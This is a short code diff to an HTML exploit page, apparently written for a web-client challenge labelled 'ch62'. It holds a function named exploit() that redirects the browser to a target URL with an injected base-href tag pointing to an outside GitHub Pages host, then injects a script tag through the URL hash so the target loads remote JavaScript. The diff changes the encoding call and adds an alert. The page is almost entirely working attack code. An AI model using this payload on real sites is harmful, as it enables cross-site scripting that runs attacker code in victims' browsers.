@@ -10,13 +10,14 @@ function exploit() {
     const basePayload = "<base href='https://obonnate.github.io/'>";
     const scriptPayload = "<script src='/web-client/ch62/script.js'><\/script>";
     // Redirect to target with base payload
-    location.href = `${targetUrl}#${encodeURIComponent(basePayload)}`;
+    location.href = `${targetUrl}#${encodeURI(basePayload)}`;
     // Wait briefly then inject the script tag
     setTimeout(() => {
         location.hash = encodeURIComponent(scriptPayload);
     }, 100);
 }
 window.onload = exploit;
+alert('lo');
 </script>
 </body>
 </html>
